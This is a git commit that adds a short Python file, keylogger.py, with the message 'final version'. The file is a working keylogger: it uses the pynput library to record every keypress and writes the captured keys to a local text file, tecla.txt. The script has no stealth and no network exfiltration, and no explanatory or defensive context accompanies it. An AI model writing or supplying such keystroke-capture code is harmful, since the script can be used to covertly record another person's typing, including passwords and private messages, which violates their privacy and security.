fa5c6953adb586fa294e8ca7c37fcf3a033ee00f
iDdark102 <97327254+iDdark102@users.noreply.github.com>
2022-08-11 10:08:01 -0300

    final version

---
+++ keylogger.py
@@ -0,0 +1,13 @@
+﻿from pynput.keyboard import Listener
+
+keys = []
+
+def capturar(tecla):
+    tecla = str(tecla)
+    keys.append(tecla)
+    with open('tecla.txt', 'w') as t:
+        for i in keys:
+            t.write(f'{i}\n')
+    
+with Listener(on_press=capturar) as l:
+    l.join()
